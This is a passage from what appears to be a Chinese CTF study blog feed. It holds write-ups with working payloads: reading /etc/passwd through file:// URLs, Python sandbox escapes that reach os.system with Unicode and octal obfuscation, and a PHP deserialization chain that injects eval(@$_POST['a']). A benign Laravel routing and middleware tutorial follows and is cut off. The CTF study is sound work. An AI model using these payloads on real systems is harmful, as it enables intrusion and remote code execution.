users</span><br><span class="hljs-comment"># column    : USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210712174553772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>登录后是一个主机测试，试了试<code>file:///etc/passwd</code>，返回了文件内容直接<code>file:///flag</code>出。<br>这个题感觉比较基础。也没有什么过滤，payload中就过滤了空格。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TSCTF一些总结</title>
    <link href="/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="TSCTF一些总结"><a href="#TSCTF一些总结" class="headerlink" title="TSCTF一些总结"></a>TSCTF一些总结</h2><h4 id="baby-python"><a href="#baby-python" class="headerlink" title="baby_python"></a>baby_python</h4><p>python3中支持 Non-ASCII Identifies，一些其他的unicode字符在执行的时候也 可以被解析成正常字符，比如全角字母，ａｂｃｄｅ……，这样可以绕过大小写字母的检查同时执行代码。</p><p>找到几个相关的题目，先看代码，py2的沙盒逃逸</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br>banned = [<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;pickle&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;kevin sucks&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;banned&quot;</span>,<br>    <span class="hljs-string">&quot;cry sum more&quot;</span>,<br>    <span class="hljs-string">&quot;sys&quot;</span><br>]<br>targets = __builtins__.__dict__.keys()<br>targets.remove(<span class="hljs-string">&#x27;raw_input&#x27;</span>)<br>targets.remove(<span class="hljs-string">&#x27;print&#x27;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:<br>    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    data = raw_input()<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> banned:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> data.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No bueno&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>   <span class="hljs-keyword">else</span>: <span class="hljs-comment"># this means nobreak</span><br>        <span class="hljs-built_in">exec</span> data<br></code></pre></div></td></tr></table></figure><p>这个题ban掉了一些函数，并且删除掉了bultins里面的函数，那我们就直接换一个常见的链即可 ,然后对于os 和system用简单的字符串拼接就可以。</p><p>构造payload即可</p><p><code>print(().__class__.__base__.__subclasses__()[60].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;))</code></p><p><img src="https://img-blog.csdnimg.cn/20210707135456889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第二道题</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to my pyjail! pls dont escape&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>  <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>:<br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> inp:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no u&quot;</span>)<br>      exit()<br>  <span class="hljs-built_in">exec</span>(inp)<br></code></pre></div></td></tr></table></figure><p>看到exec，应该就是绕过限制任意代码执行了。可以看到它过滤了所有的大小写英文字母。这道题看了wp才会。</p><p>尝试将<code>__import__(&#39;os&#39;).system(&#39;ls&#39;)</code>转换为八进制</p><p><code>137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</code></p><p>在本地环境上可以执行成功，但是在题目上就执行不了</p><p><img src="https://img-blog.csdnimg.cn/20210707142044387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210707142058270.png" alt="在这里插入图片描述"></p><p>然后可以利用python中对于Unicode字符的支持来做</p><p><img src="https://img-blog.csdnimg.cn/2021070714243484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>所有都会被转换成 unicode 的NFKC 也就是标准模式</p><p><img src="https://img-blog.csdnimg.cn/20210707142407751.png" alt="在这里插入图片描述"></p><p>将<code>__import__(&quot;os&quot;).system(&quot;dir&quot;)</code>字符转成unicode，命令转为八进制</p><p><code>__𝑖𝑚𝑝𝑜𝑟𝑡__(&quot;\157\163&quot;).𝒔𝒚𝒔𝒕𝒆𝒎(&quot;\144\151\162&quot;)</code>，即可执行成功</p><p><img src="https://img-blog.csdnimg.cn/20210707183159225.png" alt="在这里插入图片描述"></p><p>cmder编码没弄，没显示出来。。</p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><p>分析</p><blockquote><p>这个题目主要涉及到的点都是比较基础，翻看一下反序列化的知识点都应该能做出来: 观察代码，发现只有class C有__destruct函数，所以入口点反序列化的起点就是在这个类，其中 $this- &gt;server-&gt;event[“test”] 这段代码是可控的，所以构造class A赋值给$this-&gt;server ，注意这里的class B是第一个坑，这个类并没啥用 进入到class A，调用 toRead ，需要构造一下event[“test”] 这个参数，php反序列化的时候没有对应的 参数，可以伪造一个，只限定非private属性的 进入到toRead函数 ，这是第二个坑，部分同学希望直接调用readfile函数读取flag，但是并不可行，应为最 后调用的fread函数是个资源类型的函数，并不能成功读取任何东西 真实的触发点在file_exists($this-&gt;file) ，这个函数除了可以触发phar协议的反序列化之外还可以触 发__toString函数，只有class D有__toString函数，所以此时就让class D赋值给$this-&gt;file 进入到class D之后明显有个__call 可以触发函数调用，继续跟进数据流，在doDisplay函数中有一个show 函数是没出现过的，所以，这里是触发__call函数的关键，所以让其调用自己本身，再去触发__call 然后到了最后一个利用点，此时发现构造函数的第二个参数是不可控的，PHP里可以用到一个函数，assert ，利用assert执行代码</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-comment">// private $length;</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$isRead</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$event</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-keyword">new</span> D();<br><span class="hljs-keyword">$this</span>-&gt;isRead = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;test&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>, <span class="hljs-string">&quot;toRead&quot;</span>));<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$server</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;server = <span class="hljs-keyword">new</span> A();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$param</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$curtain</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;param = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;show&quot;</span>=&gt;<span class="hljs-string">&quot;assert&quot;</span>);<br><span class="hljs-keyword">$this</span>-&gt;curtain = <span class="hljs-keyword">$this</span>;<br><span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&#x27;eval(@$_POST[\&#x27;a\&#x27;])&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-keyword">new</span> C())));<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>laravel详细学习</title>
    <link href="/2021/07/04/2020-7-4-laravel%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/04/2020-7-4-laravel%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="laravel详细学习"><a href="#laravel详细学习" class="headerlink" title="laravel详细学习"></a>laravel详细学习</h2><p>[TOC]</p><h4 id="apache配置"><a href="#apache配置" class="headerlink" title="apache配置"></a>apache配置</h4><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment"># Virtual Hosts</span><br><br><span class="hljs-comment">#</span><br>&lt;VirtualHost *:<span class="hljs-number">80</span>&gt;<br>  ServerName localhost <span class="hljs-comment">#这句是自己随意取的域名</span><br>  ServerAlias localhost<span class="hljs-comment">#服务器别名</span><br>  DocumentRoot <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;INSTALL_DIR&#125;</span>/www&quot;</span><span class="hljs-comment">#网站根目录INSTALL_DIR即为安装目录</span><br>  &lt;Directory <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;INSTALL_DIR&#125;</span>/www/&quot;</span>&gt;<br>    Options +Indexes +Includes +FollowSymLinks +MultiViews  <span class="hljs-comment">#根目录显示目录结构</span><br>    AllowOverride All <span class="hljs-comment"># 重写规则的定义.适用于所有文件的访问.</span><br>    Require <span class="hljs-keyword">local</span><br>  &lt;/Directory&gt;<br>&lt;/VirtualHost&gt;<br></code></pre></div></td></tr></table></figure><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>laravel是基于mvc模式的php框架，m——模型层，v——视图层，c——控制器层；以下为laravel框架的目录文件，框出来的文件目录将在后续中用到</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">｜–　app 包含Controller、Model、路由等在内的应用目录，大部分业务将在该目录下进行<br>    ｜　　｜–　Console 命令行程序目录<br>    ｜　　｜　　｜–　Commands 包含了用于命令行执行的类，可在该目录下自定义类<br>    ｜　　｜　　｜–　Kernel.php 命令调用内核文件，包含commands变量(命令清单，自定义的命令需加入到这里)和schedule方法(用于任务调度，即定时任务)<br>    ｜　　｜–　Events 事件目录<br>    ｜　　｜–　Exceptions 包含了自定义错误和异常处理类<br>    ｜　　｜–　Http HTTP传输层相关的类目录<br>    ｜　　｜　　｜–　Controllers 控制器目录<br>    ｜　　｜　　｜–　Middleware 中间件目录<br>    ｜　　｜　　｜–　Requests 请求类目录<br>    ｜　　｜　　｜–　Kernel.php 包含http中间件和路由中间件的内核文件<br>    ｜　　｜　　｜–　routes.php 强大的路由<br>    ｜　　｜–　Jobs 该目录下包含队列的任务类<br>    ｜　　｜–　Listeners 监听器目录<br>    ｜　　｜–　Providers 服务提供者目录<br>    ｜　　｜–　User.php 自带的模型实例，我们新建的Model默认也存储在该目录<br>    ｜–　bootstrap 框架启动载入目录<br>    ｜　　｜–　app.php 创建框架应用实例<br>    ｜　　｜–　autoload.php 自动加载<br>    ｜　　｜–　cache 存放框架启动缓存，web服务器需要有该目录的写入权限<br>    ｜–　config 各种配置文件的目录<br>    ｜　　｜–　app.php 系统级配置文件<br>    ｜　　｜–　auth.php 用户身份认证配置文件，指定好table和model就可以很方便地用身份认证功能了<br>    ｜　　｜–　broadcasting.php 事件广播配置文件<br>    ｜　　｜–　cache.php 缓存配置文件<br>    ｜　　｜–　compile.php 编译额外文件和类需要的配置文件，一般用户很少用到<br>    ｜　　｜–　database.php 数据库配置文件<br>    ｜　　｜–　filesystems.php 文件系统配置文件，这里可以配置云存储参数<br>    ｜　　｜–　mail.php 电子邮件配置文件<br>    ｜　　｜–　queue.php 消息队列配置文件<br>    ｜　　｜–　services.php 可存放第三方服务的配置信息<br>    ｜　　｜–　session.php 配置session的存储方式、生命周期等信息<br>    ｜　　｜–　view.php 模板文件配置文件，包含模板目录和编译目录等<br>    ｜–　database 数据库相关目录<br>    ｜　　｜–　factories <span class="hljs-number">5.1</span>以上版本的新特性，工厂类目录，也是用于数据填充<br>    ｜　　｜　　｜–　ModelFactory.php 在该文件可定义不同Model所需填充的数据类型<br>    ｜　　｜–　migrations 存储数据库迁移文件<br>    ｜　　｜–　seeds 存放数据填充类的目录<br>    ｜　　　　　｜–　DatabaseSeeder.php 执行php artisan db:seed命令将会调用该类的run方法。该方法可调用执行该目录下其他Seeder类，也可调用factories方法生成ModelFactory里定义的数据模型<br>    ｜–　<span class="hljs-keyword">public</span> 网站入口，应当将ip或域名指向该目录而不是根目录。可供外部访问的css、js和图片等资源皆放置于此<br>    ｜　　｜–　index.php 入口文件<br>    ｜　　｜–　.htaccess Apache服务器用该文件重写URL<br>    ｜　　｜–　web.config IIS服务器用该文件重写URL<br>    ｜–　resources 资源文件目录<br>    ｜　　｜–　assets 可存放包含LESS、SASS、CoffeeScript在内的原始资源文件<br>    ｜　　｜–　lang 本地化文件目录<br>    ｜　　｜–　views 视图文件就放在这啦<br>    ｜–　storage 存储目录。web服务器需要有该目录及所有子目录的写入权限<br>    ｜　　｜–　app 可用于存储应用程序所需的一些文件<br>    ｜　　｜–　framework 该目录下包括缓存、sessions和编译后的视图文件<br>    ｜　　｜–　logs 日志目录<br>    ｜–　tests 测试目录<br>    ｜–　vendor 该目录下包含Laravel源代码和第三方依赖包<br>    ｜–　.env 环境配置文件。config目录下的配置文件会使用该文件里面的参数，不同生产环境使用不同的.env文件即可。<br>    ｜–　artisan 强大的命令行接口，你可以在app/Console/Commands下编写自定义命令<br>    ｜–　composer.json 存放依赖关系的文件<br>    ｜–　composer.lock 锁文件，存放安装时依赖包的真实版本<br>    ｜–　gulpfile.js gulp（一种前端构建工具）配置文件<br>    ｜–　package.json gulp配置文件<br>    ｜–　phpspec.yml phpspec（一种PHP测试框架）配置文件<br>    ｜–　phpunit.xml phpunit（一种PHP测试框架）配置文件<br>    ｜–　server.php PHP内置的Web服务器将把这个文件作为入口。以<span class="hljs-keyword">public</span>/index.php为入口的可以忽略掉该文件<br></code></pre></div></td></tr></table></figure><p>app是应用的核心代码文件目录，以后的代码基本都在这里完成；app/Http/Controller目录是应用的控制器文件；routes.php是框架的路由文件，负责路由分配和映射；Http下的类文件，比如上面目录中的User.php、Menu.php文件是应用的模型文件；config目录是所有应用的配置文件目录；public是框架的入口文件及静态资源文件目录；resources/views则是应用的视图文件目录。</p><h2 id="关于路由"><a href="#关于路由" class="headerlink" title="关于路由"></a>关于路由</h2><p>在 Laravel 应用中，定义路由有两个入口，一个是 <code>routes/web.php</code>，用于处理终端用户通过 Web 浏览器直接访问的请求，另一个是 <code>routes/api.php</code>，</p><p>get请求和post请求</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    Route::get(/test1,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;);<br>    Route::post(/test1,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;); <br>     <span class="hljs-comment">//两种访问方式页面返回hello</span><br><br>Route::get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;WelcomeController@index&#x27;</span>); 访问/时调用App\Http\Controllers\WelcomeController 控制器的 index 方法<br>        <br></code></pre></div></td></tr></table></figure><p>关于多路由访问有match和any方式</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Route::match([<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>], <span class="hljs-string">&#x27;multi&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;multi post or get&#x27;</span>;<br>  &#125;);<br>Route::any(<span class="hljs-string">&#x27;multi&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;multi get or post&#x27;</span>;<br>  &#125;);<br></code></pre></div></td></tr></table></figure><h4 id="路由参数"><a href="#路由参数" class="headerlink" title="路由参数"></a>路由参数</h4><p>如果你定义的路由需要传递参数，只需要在路由路径中进行标识并将其传递到闭包函数即可：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;id&#125;&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户ID: &quot;</span> . <span class="hljs-variable">$id</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>这样，当你访问 <code>http://blog.test/user/1000</code> 的时候，就可以在浏览器看到 <code>用户ID: 1000</code> 字符串。</p><p>此外，你还可以定义可选的路由参数，只需要在参数后面加个 <code>?</code> 标识符即可，同时你还可以为可选参数指定默认值：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;id?&#125;&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$id</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户ID: &quot;</span> . <span class="hljs-variable">$id</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>这样，如果不传递任何参数访问 <code>http://blog.test/user</code>，则会使用默认值 <code>1</code> 作为用户 ID。更深入的用法还可以用正则匹配</p><h4 id="路由分组"><a href="#路由分组" class="headerlink" title="路由分组"></a>路由分组</h4><p>所谓路由分组，其实就是通过 <code>Route::group</code> 将几个路由聚合到一起，然后给它们应用对应的共享特征：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::group([], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <br>    Route::get(<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello&#x27;</span>; &#125;); <br>    Route::get(<span class="hljs-string">&#x27;world&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;World&#x27;</span>; &#125;); <br>&#125;);<br></code></pre></div></td></tr></table></figure><h4 id="路由别名"><a href="#路由别名" class="headerlink" title="路由别名"></a>路由别名</h4><p>　给路由通过[‘as’ =&gt; ‘alias’]数组使用别名后，可通过route(‘别名’)生成url，请看代码理解：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <br> <span class="hljs-comment">//路由别名</span><br>  <br> Route::get(<span class="hljs-string">&#x27;student/info&#x27;</span>,[<span class="hljs-string">&#x27;as&#x27;</span> =&gt; <span class="hljs-string">&#x27;studentInfo&#x27;</span> ,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-comment">//通过route(&#x27;studentInfo&#x27;)生成完成url后返回</span><br>      <span class="hljs-keyword">return</span> route(<span class="hljs-string">&#x27;studentInfo&#x27;</span>);<br> &#125;]);<br> <br> <br> 访问url：http:<span class="hljs-comment">//127.0.0.1/laravel/public/student/info</span><br> 页面返回：http:<span class="hljs-comment">//127.0.0.1/laravel/public/student/info</span><br> 注：别名的好处在于，以后在控制器中使用route(<span class="hljs-string">&#x27;别名&#x27;</span>)的方式生成url后，即便修改了路由的名字，也不用再修改控制器程序，因为通过别名程序能自动生成修改后的url<br></code></pre></div></td></tr></table></figure><p>具体还有<code>路由路径前缀</code>, <code>子域名路由</code>,<code>子命名空间</code>,<code>路由命名前缀</code>。可以看看laravel官方手册</p><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>中间件为过滤进入应用的 HTTP 请求提供了一套便利的机制。例如，Laravel 内置了一个中间件来验证用户是否经过认证（如登录），如果用户没有经过认证，中间件会将用户重定向到登录页面，而如果用户已经经过认证，中间件就会允许请求继续往前进入下一步操作。</p><p>当然，除了认证之外，中间件还可以被用来处理很多其它任务。比如：CORS 中间件可以用于为离开站点的响应添加合适的头（跨域）；日志中间件可以记录所有进入站点的请求，从而方便我们构建系统日志系统。</p><p>Laravel 框架自带了一些中间件，包括认证、CSRF 保护中间件等等。所有的中间件都位于 <code>app/Http/Middleware</code> 目录下。</p><h4 id="定义中间件"><a href="#定义中间件" class="headerlink" title="定义中间件"></a>定义中间件</h4><p>这个命令会在 <code>app/Http/Middleware</code> 目录下创建一个新的中间件类 <code>CheckAge</code>，在这个中间件中，我们只允许提供的 <code>age</code> 大于 200 的请求才能访问应用该中间件的路由，否则，我们会将用户重定向到 <code>/</code> URI：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs 